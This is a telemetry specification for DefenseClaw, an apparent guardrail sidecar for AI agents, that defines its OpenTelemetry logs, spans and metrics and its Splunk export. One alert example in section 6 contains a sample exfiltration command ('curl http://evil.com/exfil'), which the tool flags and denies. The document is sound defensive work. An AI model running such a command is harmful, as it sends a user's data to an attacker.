# DefenseClaw OpenTelemetry Specification

DefenseClaw exports four categories of telemetry to **Splunk Observability Cloud**
via OTLP (gRPC or HTTP/protobuf). This document is the canonical reference
for attribute names, signal types, payload schemas, and configuration.

> **Audience**: DefenseClaw contributors, Splunk integration engineers, SOC
> teams building dashboards and detectors.

---

## Table of Contents

1. [Signal Summary](#1-signal-summary)
2. [Resource Attributes](#2-resource-attributes)
3. [Asset Lifecycle Events (Logs)](#3-asset-lifecycle-events-logs)
4. [Asset Scan Results (Logs + Metrics)](#4-asset-scan-results-logs--metrics)
5. [Runtime Events (Traces)](#5-runtime-events-traces)
6. [Runtime Alerts (Logs)](#6-runtime-alerts-logs)
7. [Metrics Reference](#7-metrics-reference)
8. [Configuration](#8-configuration)
9. [Integration Points](#9-integration-points)
10. [Splunk Observability Mapping](#10-splunk-observability-mapping)
11. [JSON Schemas](#11-json-schemas)

---

## 1. Signal Summary

| Category | OTEL Signal | Rationale |
|---|---|---|
| Asset lifecycle | **Logs** | Discrete events, no duration |
| Scan results | **Logs** + **Metrics** | Structured findings; counters for dashboards |
| Runtime events | **Traces** (Spans) | Tool/LLM calls have duration and parent-child relationships |
| Runtime alerts | **Logs** | Severity-tagged discrete alerts |

All signals share a common [Resource](#2-resource-attributes) identity and
use the `defenseclaw.*` attribute namespace. LLM-related attributes follow
the [OTEL GenAI semantic conventions](https://opentelemetry.io/docs/specs/semconv/gen-ai/)
using the `gen_ai.*` namespace.

---

## 2. Resource Attributes

Set once at sidecar startup. Attached to every exported log, span, and metric.

| Attribute | Type | Example | Source |
|---|---|---|---|
| `service.name` | string | `defenseclaw` | hardcoded |
| `service.version` | string | `0.5.0` | build-time `version` var |
| `service.namespace` | string | `ai-governance` | hardcoded |
| `deployment.environment` | string | `macos` | `config.Environment` |
| `tenant.id` | string | `tenant-a` | `config.tenant_id` when set |
| `workspace.id` | string | `workspace-1` | `config.workspace_id` when set |
| `deployment.mode` | string | `standalone` | `config.deployment_mode` when set |
| `discovery.source` | string | `registry` | `config.discovery_source` when set |
| `host.name` | string | `dgx-spark-01` | `os.Hostname()` |
| `host.arch` | string | `arm64` | `runtime.GOARCH` |
| `os.type` | string | `darwin` | `runtime.GOOS` |
| `defenseclaw.claw.mode` | string | `openclaw` \| `zeptoclaw` \| `claudecode` \| `codex` (or `""` before `defenseclaw setup connector`) | `config.Claw.Mode` |
| `defenseclaw.claw.home_dir` | string | `/home/user/.openclaw`, `/home/user/.zeptoclaw`, `/home/user/.claude`, `/home/user/.codex` | resolved at startup |
| `defenseclaw.device.id` | string | `a1b2c3...` | DefenseClaw Ed25519 public-key fingerprint |
| `defenseclaw.gateway.host` | string | `127.0.0.1` | `config.Gateway.Host` |
| `defenseclaw.gateway.port` | int | `18789` | `config.Gateway.Port` |
| `defenseclaw.instance.id` | string | `uuid` | generated at startup |

Notes:
- `deployment.environment` was already the normalized field and remains unchanged.
- `defenseclaw.device.id` represents the DefenseClaw device-key fingerprint used for sidecar pairing identity. It is not equivalent to `endpoint_id` or a host hardware UUID.

---

## 3. Asset Lifecycle Events (Logs)

Emitted when a skill, plugin, or MCP server is installed, uninstalled,
blocked, allowed, quarantined, restored, enabled, or disabled.

### LogRecord Fields

| Field | Value |
|---|---|
| `SeverityText` | `INFO`, `WARN`, or `ERROR` |
| `SeverityNumber` | 9 / 13 / 17 |
| `Timestamp` | event timestamp (UTC) |
| `ObservedTimestamp` | time DefenseClaw processed the event |
| `Body` | human-readable summary string |

### Attributes

| Attribute | Type | Values |
|---|---|---|
| `event.name` | string | the action (see mapping table below) |
| `event.domain` | string | `defenseclaw.asset` |
| `defenseclaw.asset.type` | string | `skill` \| `mcp` \| `plugin` |
| `defenseclaw.asset.name` | string | target name, e.g. `@anthropic/code-review` |
| `defenseclaw.asset.source_path` | string | on-disk path (if known) |
| `defenseclaw.lifecycle.action` | string | `install` \| `uninstall` \| `block` \| `allow` \| `quarantine` \| `restore` \| `enable` \| `disable` |
| `defenseclaw.lifecycle.reason` | string | human-readable reason |
| `defenseclaw.lifecycle.actor` | string | `defenseclaw` \| `user` \| `watcher` \| `gateway` |
| `defenseclaw.enforcement.install` | string | `block` \| `allow` \| `""` |
| `defenseclaw.enforcement.file` | string | `quarantine` \| `""` |
| `defenseclaw.enforcement.runtime` | string | `disable` \| `""` |

### Action Mapping

Maps existing `audit.Event.Action` strings to OTEL attributes:

| `audit.Event.Action` | `lifecycle.action` | `lifecycle.actor` |
|---|---|---|
| `install-detected` | `install` | `watcher` |
| `install-rejected` | `block` | `watcher` |
| `install-allowed` | `allow` | `watcher` |
| `install-clean` | `install` | `watcher` |
| `install-warning` | `install` | `watcher` |
| `block` | `block` | `user` |
| `allow` | `allow` | `user` |
| `quarantine` | `quarantine` | `defenseclaw` |
| `restore` | `restore` | `user` |
| `deploy` | `install` | `user` |
| `stop` | `uninstall` | `user` |

### Example

```json
{
  "timeUnixNano": "1711324800000000000",
  "severityText": "WARN",
  "severityNumber": 13,
  "body": {
    "stringValue": "skill @anthropic/code-review blocked: HIGH severity findings detected"
  },
  "attributes": [
    { "key": "event.name",                       "value": { "stringValue": "block" } },
    { "key": "event.domain",                     "value": { "stringValue": "defenseclaw.asset" } },
    { "key": "defenseclaw.asset.type",           "value": { "stringValue": "skill" } },
    { "key": "defenseclaw.asset.name",           "value": { "stringValue": "@anthropic/code-review" } },
    { "key": "defenseclaw.asset.source_path",    "value": { "stringValue": "/home/user/.openclaw/skills/code-review" } },
    { "key": "defenseclaw.lifecycle.action",     "value": { "stringValue": "block" } },
    { "key": "defenseclaw.lifecycle.reason",     "value": { "stringValue": "HIGH severity findings detected" } },
    { "key": "defenseclaw.lifecycle.actor",      "value": { "stringValue": "watcher" } },
    { "key": "defenseclaw.enforcement.install",  "value": { "stringValue": "block" } },
    { "key": "defenseclaw.enforcement.file",     "value": { "stringValue": "quarantine" } },
    { "key": "defenseclaw.enforcement.runtime",  "value": { "stringValue": "disable" } }
  ]
}
```

---

## 4. Asset Scan Results (Logs + Metrics)

### 4a. Scan Summary Log

One LogRecord per completed scan.

| Field | Value |
|---|---|
| `SeverityText` | derived from `MaxSeverity` (`CRITICAL`→`ERROR`, `HIGH`→`WARN`, else `INFO`) |
| `SeverityNumber` | 17 / 13 / 9 |
| `Body` | JSON-encoded scan summary (see below) |

#### Attributes

| Attribute | Type | Description |
|---|---|---|
| `event.name` | string | `scan.completed` |
| `event.domain` | string | `defenseclaw.scan` |
| `defenseclaw.scan.id` | string | scan UUID |
| `defenseclaw.scan.scanner` | string | `skill-scanner` \| `mcp-scanner` \| `cisco-aibom` \| `<plugin>` |
| `defenseclaw.scan.target` | string | target name or path |
| `defenseclaw.scan.target_type` | string | `skill` \| `mcp` \| `plugin` |
| `defenseclaw.scan.duration_ms` | int | scan duration in milliseconds |
| `defenseclaw.scan.finding_count` | int | total findings |
| `defenseclaw.scan.max_severity` | string | `CRITICAL` \| `HIGH` \| `MEDIUM` \| `LOW` \| `INFO` |
| `defenseclaw.scan.finding_count.critical` | int | count at CRITICAL |
| `defenseclaw.scan.finding_count.high` | int | count at HIGH |
| `defenseclaw.scan.finding_count.medium` | int | count at MEDIUM |
| `defenseclaw.scan.finding_count.low` | int | count at LOW |
| `defenseclaw.scan.verdict` | string | `clean` \| `warning` \| `blocked` \| `rejected` |

#### Body Schema

```json
{
  "scan_id": "a1b2c3d4-...",
  "scanner": "skill-scanner",
  "target": "@anthropic/code-review",
  "target_type": "skill",
  "timestamp": "2026-03-24T10:30:00Z",
  "duration_ms": 4523,
  "finding_count": 3,
  "max_severity": "HIGH",
  "findings": [
    {
      "id": "f1",
      "severity": "HIGH",
      "title": "Unrestricted network access",
      "description": "Skill makes outbound HTTP requests to arbitrary URLs",
      "location": "skill.yaml:permissions",
      "remediation": "Restrict allowed_endpoints to known hosts",
      "scanner": "skill-scanner",
      "tags": ["network", "exfiltration"]
    }
  ]
}
```

### 4b. Individual Finding Logs

One LogRecord per finding for fine-grained Splunk search. Opt-in via
`otel.logs.emit_individual_findings: true`.

| Attribute | Type | Description |
|---|---|---|
| `event.name` | string | `scan.finding` |
| `event.domain` | string | `defenseclaw.scan` |
| `defenseclaw.scan.id` | string | parent scan UUID |
| `defenseclaw.finding.id` | string | finding UUID |
| `defenseclaw.finding.severity` | string | `CRITICAL` \| `HIGH` \| `MEDIUM` \| `LOW` \| `INFO` |
| `defenseclaw.finding.title` | string | short title |
| `defenseclaw.finding.scanner` | string | scanner that produced the finding |
| `defenseclaw.finding.location` | string | file and line/section |
| `defenseclaw.finding.tags` | string[] | classification tags |
| `defenseclaw.scan.target` | string | asset name |
| `defenseclaw.scan.target_type` | string | `skill` \| `mcp` \| `plugin` |

### 4c. Scan Metrics

See [Section 7 — Metrics Reference](#7-metrics-reference).

---

## 5. Runtime Events (Traces)

Runtime events from the OpenClaw gateway (WebSocket events routed through
`EventRouter`) map to OTEL Spans with parent-child relationships.

### 5a. Span Hierarchy

#### Guardrail Proxy Path (LLM Gateway)

The guardrail proxy intercepts OpenAI-compatible requests and produces the
full GenAI semconv trace hierarchy:

```
invoke_agent {agentName}                    ✓ root span — per HTTP request
├── apply_guardrail defenseclaw input       ✓ input inspection
└── chat {model}                            ✓ LLM call (SpanKind=CLIENT)
    ├── apply_guardrail defenseclaw output  ✓ output inspection (if content present)
    ├── execute_tool {toolName}             ✓ per tool_call in LLM response
    │   └── apply_guardrail defenseclaw tool_call  ✓ tool args inspection
    └── execute_tool {toolName}
        └── apply_guardrail defenseclaw tool_call
```

#### WebSocket Event Router Path

Tool and approval spans from real-time agent session events:

```
tool/{tool_name}                            ✓ from tool_call → tool_result WS events
  └── exec.approval/{approval_id}           ✓ from exec.approval.requested WS events
```

### 5b. Tool Call Span

**WS path**: Created on `tool_call` event; ended on matching `tool_result`.

| Field | Value |
|---|---|
| `name` | `tool/{tool_name}` |
| `kind` | `INTERNAL` |
| `start_time` | `tool_call` event timestamp |
| `end_time` | `tool_result` event timestamp |
| `status` | `OK` or `ERROR` (from `exit_code`) |

#### Attributes (WS path)

| Attribute | Type | Description |
|---|---|---|
| `gen_ai.operation.name` | string | `execute_tool` |
| `gen_ai.tool.name` | string | tool name |
| `gen_ai.tool.type` | string | `function` |
| `defenseclaw.tool.status` | string | status from `tool_call` payload |
| `defenseclaw.tool.args_length` | int | byte length of arguments |
| `defenseclaw.tool.exit_code` | int | from `tool_result` |
| `defenseclaw.tool.output_length` | int | byte length of `tool_result` output |
| `defenseclaw.tool.dangerous` | bool | matched dangerous pattern |
| `defenseclaw.tool.flagged_pattern` | string | the matched pattern (if dangerous) |
| `defenseclaw.tool.provider` | string | `skill` \| `builtin` \| `mcp` |
| `defenseclaw.tool.skill_key` | string | skill key (if tool comes from a skill) |

#### Span Events

| Event Name | Attributes |
|---|---|
| `tool.flagged` | `defenseclaw.flag.reason`, `defenseclaw.flag.pattern` |

**Proxy path**: Created for each `tool_call` entry in the LLM response's
`choices[0].message.tool_calls` array. Child of the `chat` span.

| Field | Value |
|---|---|
| `name` | `execute_tool {tool_name}` |
| `kind` | `INTERNAL` |
| `status` | `OK` |

#### Attributes (Proxy path)

| Attribute | Type | Description |
|---|---|---|
| `gen_ai.operation.name` | string | `execute_tool` |
| `gen_ai.tool.name` | string | tool function name |
| `gen_ai.tool.type` | string | `function` |

### 5c. Exec Approval Span

Nested under the tool call span, or standalone if no parent.

| Field | Value |
|---|---|
| `name` | `exec.approval/{approval_id}` |
| `kind` | `INTERNAL` |
| `start_time` | `exec.approval.requested` timestamp |
| `end_time` | when resolved or timed out |

#### Attributes

| Attribute | Type | Description |
|---|---|---|
| `defenseclaw.approval.id` | string | approval request UUID |
| `defenseclaw.approval.command` | string | `rawCommand`, truncated |
| `defenseclaw.approval.argv` | string[] | command argv |
| `defenseclaw.approval.cwd` | string | working directory |
| `defenseclaw.approval.result` | string | `approved` \| `denied` \| `timeout` |
| `defenseclaw.approval.reason` | string | reason string |
| `defenseclaw.approval.auto` | bool | was auto-approved |
| `defenseclaw.approval.dangerous` | bool | matched dangerous pattern |

### 5d. LLM Call Span ✅ IMPLEMENTED

> **Status**: Implemented via guardrail proxy path. Created when an HTTP
> request is forwarded to the upstream LLM provider (`handleNonStreamingRequest`
> in `proxy.go`). Child of the `invoke_agent` span.

| Field | Value |
|---|---|
| `name` | `chat {model}` |
| `kind` | `CLIENT` |
| `start_time` | before upstream request |
| `end_time` | after upstream response |
| `status` | `OK` or `ERROR` (if guardrail blocked) |

#### Attributes

Uses [OTEL GenAI semantic conventions](https://opentelemetry.io/docs/specs/semconv/gen-ai/):

| Attribute | Type | Description |
|---|---|---|
| `gen_ai.operation.name` | string | `chat` |
| `gen_ai.system` | string | `openai` \| `anthropic` \| `nvidia-nim` \| ... |
| `gen_ai.provider.name` | string | provider identifier (e.g. `defenseclaw`) |
| `gen_ai.request.model` | string | requested model |
| `gen_ai.response.model` | string | actual model used |
| `gen_ai.request.max_tokens` | int | max tokens parameter |
| `gen_ai.request.temperature` | float | temperature parameter |
| `gen_ai.response.finish_reasons` | string[] | `["stop"]` \| `["tool_calls"]` |
| `gen_ai.usage.input_tokens` | int | input tokens |
| `gen_ai.usage.output_tokens` | int | output tokens |
| `defenseclaw.llm.tool_calls` | int | number of tool_use blocks |
| `defenseclaw.llm.guardrail` | string | `none` \| `local` \| `ai-defense` |
| `defenseclaw.llm.guardrail.result` | string | `pass` \| `flagged` \| `blocked` |

#### Metrics (emitted per LLM call)

| Metric | Attributes |
|---|---|
| `gen_ai.client.token.usage` | `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.token.type` (`input`/`output`), `gen_ai.agent.name` / `gen_ai.agent.id` when known |
| `gen_ai.client.operation.duration` | `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.agent.name` / `gen_ai.agent.id` when known |

### 5e. Guardrail Span ✅ IMPLEMENTED

Created by the guardrail proxy when inspecting input, output, or tool call
arguments. Follows [OTel GenAI semconv PR #3233](https://github.com/open-telemetry/semantic-conventions/pull/3233).

| Field | Value |
|---|---|
| `name` | `apply_guardrail {name} {targetType}` |
| `kind` | `INTERNAL` |
| `status` | `OK` or `ERROR` (if blocked) |

#### Attributes

| Attribute | Type | Description |
|---|---|---|
| `gen_ai.operation.name` | string | `apply_guardrail` |
| `gen_ai.guardrail.name` | string | `defenseclaw` |
| `gen_ai.security.target.type` | string | `input` \| `output` \| `tool_call` |
| `gen_ai.request.model` | string | model being guarded |
| `gen_ai.security.decision.type` | string | `allow` \| `warn` \| `deny` |
| `defenseclaw.guardrail.severity` | string | severity from inspector |
| `defenseclaw.guardrail.reason` | string | reason (truncated 256 chars) |

#### Parent Relationships

| Target Type | Parent Span |
|---|---|
| `input` | `invoke_agent` (root) |
| `output` | `chat` (LLM span) |
| `tool_call` | `execute_tool` (tool span) |

### 5f. Invoke Agent Span ✅ IMPLEMENTED

Root span for each guardrail proxy HTTP request. Groups all child spans
(input guardrail, LLM call, output guardrail, tool calls) into a single
trace.

| Field | Value |
|---|---|
| `name` | `invoke_agent {agentName}` |
| `kind` | `INTERNAL` |
| `status` | `OK` or `ERROR` |

#### Attributes

| Attribute | Type | Description |
|---|---|---|
| `gen_ai.operation.name` | string | `invoke_agent` |
| `gen_ai.agent.id` | string | logical stable agent id, when known |
| `gen_ai.agent.name` | string | agent name (e.g. `openclaw`) |
| `gen_ai.conversation.id` | string | conversation/session identifier |
| `gen_ai.provider.name` | string | provider (if set) |

---

## 6. Runtime Alerts (Logs)

High-priority log records emitted when a runtime scan flags content or a
dangerous tool pattern is detected.

### LogRecord Fields

| Field | Value |
|---|---|
| `SeverityText` | `CRITICAL` \| `HIGH` \| `MEDIUM` \| `LOW` |
| `SeverityNumber` | 21 / 17 / 13 / 9 |
| `Body` | human-readable alert summary |

### Attributes

| Attribute | Type | Description |
|---|---|---|
| `event.name` | string | `runtime.alert` |
| `event.domain` | string | `defenseclaw.runtime` |
| `defenseclaw.alert.id` | string | alert UUID |
| `defenseclaw.alert.type` | string | `dangerous-command` \| `guardrail-flag` \| `guardrail-block` \| `prompt-injection` \| `data-exfiltration` \| `content-violation` |
| `defenseclaw.alert.severity` | string | `CRITICAL` \| `HIGH` \| `MEDIUM` \| `LOW` |
| `defenseclaw.alert.source` | string | `local-pattern` \| `local-guardrail` \| `ai-defense` \| `opa-policy` \| `codeguard` |
| `defenseclaw.alert.trigger.tool` | string | tool name (if tool-triggered) |
| `defenseclaw.alert.trigger.command` | string | command (if exec-triggered) |
| `defenseclaw.alert.trigger.model` | string | model (if LLM-triggered) |
| `defenseclaw.alert.trigger.direction` | string | `input` \| `output` |
| `defenseclaw.guardrail.scanner` | string | `ai-defense` \| `skill-scanner` \| `opa` |
| `defenseclaw.guardrail.policy` | string | policy name that triggered |
| `defenseclaw.guardrail.action_taken` | string | `log` \| `warn` \| `block` \| `deny` |
| `defenseclaw.guardrail.confidence` | float | 0.0–1.0 (if available) |
| `defenseclaw.alert.trace_id` | string | trace ID of the triggering span |
| `defenseclaw.alert.span_id` | string | span ID of the triggering call |
| `defenseclaw.alert.scan.id` | string | scan ID (if from a scan result) |

### Example: Dangerous Command Alert

```json
{
  "timeUnixNano": "1711324800500000000",
  "severityText": "HIGH",
  "severityNumber": 17,
  "body": {
    "stringValue": "Dangerous command detected in exec approval: curl http://evil.com/exfil"
  },
  "attributes": [
    { "key": "event.name",                        "value": { "stringValue": "runtime.alert" } },
    { "key": "event.domain",                       "value": { "stringValue": "defenseclaw.runtime" } },
    { "key": "defenseclaw.alert.id",               "value": { "stringValue": "b2c3d4e5-..." } },
    { "key": "defenseclaw.alert.type",             "value": { "stringValue": "dangerous-command" } },
    { "key": "defenseclaw.alert.severity",         "value": { "stringValue": "HIGH" } },
    { "key": "defenseclaw.alert.source",           "value": { "stringValue": "local-pattern" } },
    { "key": "defenseclaw.alert.trigger.tool",     "value": { "stringValue": "shell" } },
    { "key": "defenseclaw.alert.trigger.command",  "value": { "stringValue": "curl http://evil.com/exfil" } },
    { "key": "defenseclaw.guardrail.action_taken", "value": { "stringValue": "deny" } },
    { "key": "defenseclaw.alert.span_id",          "value": { "stringValue": "abc123..." } }
  ]
}
```

### Example: AI Defense Guardrail Alert

```json
{
  "timeUnixNano": "1711324801000000000",
  "severityText": "CRITICAL",
  "severityNumber": 21,
  "body": {
    "stringValue": "AI Defense flagged prompt injection in LLM input: confidence=0.97"
  },
  "attributes": [
    { "key": "event.name",                        "value": { "stringValue": "runtime.alert" } },
    { "key": "event.domain",                       "value": { "stringValue": "defenseclaw.runtime" } },
    { "key": "defenseclaw.alert.id",               "value": { "stringValue": "c3d4e5f6-..." } },
    { "key": "defenseclaw.alert.type",             "value": { "stringValue": "prompt-injection" } },
    { "key": "defenseclaw.alert.severity",         "value": { "stringValue": "CRITICAL" } },
    { "key": "defenseclaw.alert.source",           "value": { "stringValue": "ai-defense" } },
    { "key": "defenseclaw.alert.trigger.model",    "value": { "stringValue": "gpt-4" } },
    { "key": "defenseclaw.alert.trigger.direction","value": { "stringValue": "input" } },
    { "key": "defenseclaw.guardrail.scanner",      "value": { "stringValue": "ai-defense" } },
    { "key": "defenseclaw.guardrail.policy",       "value": { "stringValue": "prompt-injection-detect" } },
    { "key": "defenseclaw.guardrail.action_taken", "value": { "stringValue": "block" } },
    { "key": "defenseclaw.guardrail.confidence",   "value": { "doubleValue": 0.97 } },
    { "key": "defenseclaw.alert.trace_id",         "value": { "stringValue": "4a5b6c7d..." } },
    { "key": "defenseclaw.alert.span_id",          "value": { "stringValue": "def456..." } }
  ]
}
```

---

## 7. Metrics Reference

All metrics use the `defenseclaw.*` namespace.

### Scan Metrics

| Metric | Type | Unit | Attributes |
|---|---|---|---|
| `defenseclaw.scan.count` | Counter | `{scan}` | `scanner`, `target_type`, `verdict` |
| `defenseclaw.scan.duration` | Histogram | `ms` | `scanner`, `target_type` |
| `defenseclaw.scan.findings` | Counter | `{finding}` | `scanner`, `target_type`, `severity` |
| `defenseclaw.scan.findings.gauge` | UpDownCounter | `{finding}` | `target_type`, `severity` |

### Runtime Metrics

| Metric | Type | Unit | Attributes |
|---|---|---|---|
| `defenseclaw.tool.calls` | Counter | `{call}` | `gen_ai.tool.name`, `tool.provider`, `dangerous` |
| `defenseclaw.tool.duration` | Histogram | `ms` | `gen_ai.tool.name`, `tool.provider` |
| `defenseclaw.tool.errors` | Counter | `{error}` | `gen_ai.tool.name`, `exit_code` |
| `defenseclaw.approval.count` | Counter | `{request}` | `result`, `auto`, `dangerous` |

### GenAI Semconv Metrics

| Metric | Type | Unit | Buckets | Attributes |
|---|---|---|---|---|
| `gen_ai.client.token.usage` | Histogram | `{token}` | 1,4,16,64,256,1K,4K,16K,64K,256K,1M,4M,16M,64M | `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.token.type`, `gen_ai.agent.name` / `gen_ai.agent.id` when known |
| `gen_ai.client.operation.duration` | Histogram | `s` | 0.01,0.02,0.04,...,81.92 | `gen_ai.operation.name`, `gen_ai.provider.name`, `gen_ai.request.model`, `gen_ai.agent.name` / `gen_ai.agent.id` when known |

> **Note**: Buckets follow [OTel GenAI semconv metrics spec](https://github.com/open-telemetry/semantic-conventions/blob/main/docs/gen-ai/gen-ai-metrics.md). `gen_ai.token.type` values are `input` and `output`.

### Alert Metrics

| Metric | Type | Unit | Attributes |
|---|---|---|---|
| `defenseclaw.alert.count` | Counter | `{alert}` | `alert.type`, `alert.severity`, `alert.source` |
| `defenseclaw.guardrail.evaluations` | Counter | `{evaluation}` | `guardrail.scanner`, `guardrail.action_taken` |
| `defenseclaw.guardrail.latency` | Histogram | `ms` | `guardrail.scanner` |

---

## 8. Configuration

### Config Section

Add to `~/.defenseclaw/config.yaml` under the `otel` key:

```yaml
otel:
  enabled: false
  protocol: "grpc"                                      # "grpc" or "http"
  endpoint: "https://ingest.us1.signalfx.com"           # Splunk Observability Cloud OTLP endpoint
  headers:
    "X-SF-TOKEN": "${SPLUNK_ACCESS_TOKEN}"              # env var substitution
  tls:
    insecure: false
    ca_cert: ""
  traces:
    enabled: true
    sampler: "always_on"                                # or "parentbased_traceidratio"
    sampler_arg: "1.0"
  logs:
    enabled: true
    emit_individual_findings: false                     # one LogRecord per finding
  metrics:
    enabled: true
    export_interval_s: 60
  batch:
    max_export_batch_size: 512
    scheduled_delay_ms: 5000
    max_queue_size: 2048
  resource:
    attributes:                                         # additional resource attrs
      deployment.environment: "production"
```

### Environment Variables

| Variable | Purpose |
|---|---|
| `SPLUNK_ACCESS_TOKEN` | Splunk Observability Cloud ingest token |
| `OTEL_EXPORTER_OTLP_ENDPOINT` | Override `otel.endpoint` |
| `OTEL_EXPORTER_OTLP_HEADERS` | Override `otel.headers` |
| `OTEL_RESOURCE_ATTRIBUTES` | Additional resource attributes |

### Go Config Struct

```go
type OTelConfig struct {
    Enabled  bool              `mapstructure:"enabled"  yaml:"enabled"`
    Protocol string            `mapstructure:"protocol" yaml:"protocol"`
    Endpoint string            `mapstructure:"endpoint" yaml:"endpoint"`
    Headers  map[string]string `mapstructure:"headers"  yaml:"headers"`
    TLS      struct {
        Insecure bool   `mapstructure:"insecure" yaml:"insecure"`
        CACert   string `mapstructure:"ca_cert"  yaml:"ca_cert"`
    } `mapstructure:"tls" yaml:"tls"`
    Traces struct {
        Enabled    bool   `mapstructure:"enabled"     yaml:"enabled"`
        Sampler    string `mapstructure:"sampler"      yaml:"sampler"`
        SamplerArg string `mapstructure:"sampler_arg"  yaml:"sampler_arg"`
    } `mapstructure:"traces" yaml:"traces"`
    Logs struct {
        Enabled                bool `mapstructure:"enabled"                  yaml:"enabled"`
        EmitIndividualFindings bool `mapstructure:"emit_individual_findings" yaml:"emit_individual_findings"`
    } `mapstructure:"logs" yaml:"logs"`
    Metrics struct {
        Enabled         bool `mapstructure:"enabled"            yaml:"enabled"`
        ExportIntervalS int  `mapstructure:"export_interval_s"  yaml:"export_interval_s"`
    } `mapstructure:"metrics" yaml:"metrics"`
    Batch struct {
        MaxExportBatchSize int `mapstructure:"max_export_batch_size" yaml:"max_export_batch_size"`
        ScheduledDelayMs   int `mapstructure:"scheduled_delay_ms"    yaml:"scheduled_delay_ms"`
        MaxQueueSize       int `mapstructure:"max_queue_size"         yaml:"max_queue_size"`
    } `mapstructure:"batch" yaml:"batch"`
    Resource struct {
        Attributes map[string]string `mapstructure:"attributes" yaml:"attributes"`
    } `mapstructure:"resource" yaml:"resource"`
}
```

---

## 9. Integration Points

### 9a. `audit.Logger` — Lifecycle + Scan Events

`LogScan()` and `LogAction()` centralize all audit writes. The OTEL emitter
hooks in alongside the existing Splunk HEC forwarder:

```go
// In Logger.LogScan():
l.forwardToSplunk(event)        // existing HEC path
if l.otel != nil {
    l.otel.EmitScanResult(result)
}

// In Logger.LogAction():
l.forwardToSplunk(event)
if l.otel != nil {
    l.otel.EmitLifecycleEvent(action, target, details, severity)
}
```

### 9b. `gateway.EventRouter` — Runtime Spans + Alerts

The router handles `tool_call`, `tool_result`, `exec.approval.requested`.
Span lifecycle hooks into existing handlers:

```go
// In handleToolCall():
span := r.otel.StartToolSpan(payload.Tool, payload.Args, payload.Status)
r.activeToolSpans[payload.Tool] = span

// In handleToolResult():
if span, ok := r.activeToolSpans[payload.Tool]; ok {
    r.otel.EndToolSpan(span, payload.ExitCode, payload.Output)
}

// In handleApprovalRequest() when denied:
r.otel.EmitRuntimeAlert(AlertDangerousCommand, payload, "denied")
```

### 9c. Guardrail Proxy — LLM Gateway ✅ IMPLEMENTED

The guardrail proxy (`internal/gateway/proxy.go`) intercepts
OpenAI-compatible `/v1/chat/completions` requests and produces the full
GenAI semconv trace hierarchy:

```go
// In handleNonStreamingRequest():
agentCtx, agentSpan := p.otel.StartAgentSpan(ctx, conversationID, "openclaw", "")
grSpan := p.otel.StartGuardrailSpan(agentCtx, "defenseclaw", "input", model)
// ... inspect input ...
p.otel.EndGuardrailSpan(grSpan, decision, severity, reason, t0)
llmCtx, llmSpan := p.otel.StartLLMSpan(agentCtx, system, model, provider, maxTokens, temp)
// ... forward to upstream LLM ...
grSpan = p.otel.StartGuardrailSpan(llmCtx, "defenseclaw", "output", model)
// ... inspect output ...
p.otel.EndGuardrailSpan(grSpan, decision, severity, reason, t0)
p.emitToolCallSpans(reqCtx, llmCtx, toolCalls, model, mode) // tool_call + guardrail per tool
p.otel.EndLLMSpan(llmSpan, model, tokens, finishReasons, toolCallCount, ...)
p.otel.EndAgentSpan(agentSpan, "")
```

### 9d. WebSocket Event Router — Tool/Approval Spans

The router handles `tool_call`, `tool_result`, `exec.approval.requested`
WebSocket events. See §5b and §5c for span details.

### 9e. Package Structure

```
internal/
  telemetry/
    provider.go       # InitProvider(cfg) — TracerProvider, LoggerProvider, MeterProvider
    resource.go       # buildResource(cfg) — shared Resource with all attributes
    lifecycle.go      # EmitLifecycleEvent(...)
    scan.go           # EmitScanResult(...)
    runtime.go        # Agent/LLM/Tool/Approval/Guardrail spans + metrics
    alerts.go         # EmitRuntimeAlert(...)
    metrics.go        # Counter/histogram registration and recording
    policy.go         # PolicySpan + policy metrics
    shutdown.go       # Graceful flush + shutdown on context cancel
  gateway/
    proxy.go          # Guardrail proxy — full GenAI trace hierarchy
    router.go         # WS EventRouter — tool/approval spans
    inspect.go        # CodeGuard — inspect spans + alerts
    api.go            # REST API — policy spans
```

### 9f. Dual Export: Splunk HEC + OTEL

The existing `SplunkForwarder` (HEC-based) remains for backward
compatibility. When both `splunk.enabled` and `otel.enabled` are true,
events are dual-exported:

```
audit.Logger
  ├── splunk.ForwardEvent(e)     existing HEC path (flat JSON)
  └── telemetry.Emit*(...)       new OTEL path (structured, semantic)
```

---

## 10. Splunk Observability Mapping

### Signal → Splunk Product

| OTEL Signal | Splunk Product |
|---|---|
| Traces (spans) | Splunk APM |
| Logs | Splunk Log Observer (Connect) |
| Metrics | Splunk Infrastructure Monitoring |

### Attribute → Splunk Field

| OTEL Concept | Splunk Observability Cloud |
|---|---|
| Resource attributes | Indexed dimensions on all signals |
| Log `SeverityText` | `severity` in Log Observer |
| Log `Body` | `body` (full-text searchable) |
| Log attributes | Indexed fields, filterable in Log Observer |
| Span `name` | Operation name in APM |
| Span attributes | Span tags in APM |
| Metrics | IM charts, dashboards, detectors |

### Trace-Log Correlation

Alert logs carry `defenseclaw.alert.trace_id` and `defenseclaw.alert.span_id`
to enable Splunk's **Related Content** feature — clicking an alert in Log
Observer jumps to the trace that triggered it.

### Endpoint Configuration by Realm

| Protocol | Endpoint Format |
|---|---|
| gRPC | `https://ingest.<realm>.signalfx.com` |
| HTTP | `https://ingest.<realm>.signalfx.com/v2/trace` |

### Cardinality Guidance

- `gen_ai.tool.name` — bounded by OpenClaw's tool catalog (typically < 50)
- `gen_ai.request.model` — bounded by provider model count (< 20)
- `defenseclaw.scan.target` — can grow; use `target_type` for dashboard grouping
- `defenseclaw.alert.type` — fixed enum (6 values)

---

## 11. JSON Schemas

Machine-readable JSON Schemas for each event category are available in:

```
schemas/otel/
  resource.schema.json
  asset-lifecycle-event.schema.json
  scan-result-event.schema.json
  scan-finding-event.schema.json
  runtime-tool-span.schema.json
  runtime-llm-span.schema.json
  runtime-approval-span.schema.json
  runtime-alert-event.schema.json
  metrics.schema.json
```

These schemas define the exact attribute names, types, enumerations, and
required fields for each telemetry payload. Use them for validation,
code generation, and Splunk field extraction configuration.

---

## Go Dependencies

```
go.opentelemetry.io/otel
go.opentelemetry.io/otel/sdk
go.opentelemetry.io/otel/sdk/log
go.opentelemetry.io/otel/sdk/metric
go.opentelemetry.io/otel/exporters/otlp/otlptrace/otlptracegrpc
go.opentelemetry.io/otel/exporters/otlp/otlplog/otlploggrpc
